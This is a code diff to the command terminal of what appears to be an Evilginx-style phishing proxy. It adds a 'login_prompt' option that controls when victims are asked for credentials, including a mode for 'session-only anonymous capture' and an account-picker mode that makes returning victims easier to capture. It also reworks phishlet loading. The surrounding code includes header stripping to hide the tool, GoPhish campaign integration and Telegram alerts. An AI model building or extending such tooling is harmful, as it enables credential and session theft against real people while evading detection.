@@ -244,10 +244,11 @@ func (t *Terminal) handleConfig(args []string) error {
 		}
 		forceLoginDisplay := "off"
 		if t.cfg.IsForceLoginEnabled() {
-			forceLoginDisplay = "on (prompt=login)"
+			forceLoginDisplay = "on (prompt=" + t.cfg.GetLoginPrompt() + ")"
 		}
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "unauth_redirect", "force_login", "autocert", "strip_headers", "dashboard_sub", "dashboard_user", "dashboard_pass", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken", "turnstile"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, unauthRedirectDisplay, forceLoginDisplay, autocertOnOff, t.cfg.GetStripHeadersStatus(), dashSub, dashUser, dashPassDisplay, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken, turnstileDisplay}
+		loginPromptDisplay := t.cfg.GetLoginPrompt() + " (off = session-only anonymous capture)"
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "unauth_redirect", "force_login", "login_prompt", "autocert", "strip_headers", "dashboard_sub", "dashboard_user", "dashboard_pass", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken", "turnstile"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, unauthRedirectDisplay, forceLoginDisplay, loginPromptDisplay, autocertOnOff, t.cfg.GetStripHeadersStatus(), dashSub, dashUser, dashPassDisplay, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken, turnstileDisplay}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -343,16 +344,15 @@ func (t *Terminal) handleConfig(args []string) error {
 				return nil
 			}
 		case "force_login":
-			switch args[1] {
-			case "on":
-				t.cfg.SetForceLogin(true)
-				return nil
-			case "off":
-				t.cfg.SetForceLogin(false)
-				return nil
-			default:
-				return fmt.Errorf("usage: config force_login on|off")
+			if err := t.cfg.SetLoginPrompt(args[1]); err != nil {
+				return fmt.Errorf("%v (usage: config force_login on|off, alias of login_prompt)", err)
 			}
+			return nil
+		case "login_prompt":
+			if err := t.cfg.SetLoginPrompt(args[1]); err != nil {
+				return fmt.Errorf("%v (usage: config login_prompt off|login|select_account)", err)
+			}
+			return nil
 		case "unauth_redirect":
 			switch args[1] {
 			case "on":
@@ -921,27 +921,27 @@ func (t *Terminal) handlePhishlets(args []string) error {
 		case "refresh":
 			reloadedEnabled := false
 			pDir := t.cfg.GetPhishletsDir()
-			files, ferr := os.ReadDir(pDir)
+			files, scanWarnings, ferr := ScanPhishletsDir(pDir)
 			if ferr != nil {
 				return fmt.Errorf("refresh: cannot read phishlets directory '%s': %v", pDir, ferr)
 			}
+			for _, w := range scanWarnings {
+				log.Warning("phishlets: %s", w)
+			}
 			for _, f := range files {
-				if f.IsDir() {
-					continue
-				}
-				name, ok := PhishletSiteFromFile(f.Name())
-				if !ok {
-					continue
-				}
-				fPath := filepath.Join(pDir, f.Name())
+				name := f.Site
+				fPath := f.Path
 				existing, lookupErr := t.cfg.GetPhishlet(name)
 				if lookupErr == nil && existing.ParentName != "" {
 					continue // skip child phishlets
 				}
 				newPl, parseErr := NewPhishlet(name, fPath, nil, t.cfg)
 				if parseErr != nil {
-					log.Error("refresh: failed to parse '%s': %v", f.Name(), parseErr)
+					log.Error("refresh: failed to parse '%s': %v", filepath.Base(fPath), parseErr)
 					continue
+				}
+				for _, w := range newPl.DuplicatePhishSubs() {
+					log.Warning("phishlet '%s': %s", name, w)
 				}
 				if lookupErr != nil {
 					t.cfg.AddPhishlet(name, newPl)
@@ -1892,6 +1892,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("chatid"), readline.PcItem("teletoken"),
 			readline.PcItem("strip_headers", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("force_login", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("login_prompt", readline.PcItem("off"), readline.PcItem("login"), readline.PcItem("select_account")),
 			readline.PcItem("unauth_redirect", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("test"))))
@@ -1910,7 +1911,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"telegram", "test"}, "telegram test", "send a test notification to your Telegram to verify the configuration")
 	h.AddSubCommand("config", []string{"strip_headers"}, "strip_headers <on|off>", "enable or disable removal of identifiable Evilginx headers (X-Evilginx, Via, X-Forwarded-*, etc.) from all requests and responses")
 
-	h.AddSubCommand("config", []string{"force_login"}, "force_login <on|off>", "force the identity provider to show its login form (prompt=login / wfresh=0) even when the visitor already has a session")
+	h.AddSubCommand("config", []string{"login_prompt"}, "login_prompt <off|login|select_account>", "what the provider is asked to show: off = never prompt (session-only anonymous capture), login = always ask for credentials, select_account = show the account picker so a returning visitor picks their tile and skips typing the email")
+	h.AddSubCommand("config", []string{"force_login"}, "force_login <on|off>", "legacy alias of login_prompt: on = login, off = off")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
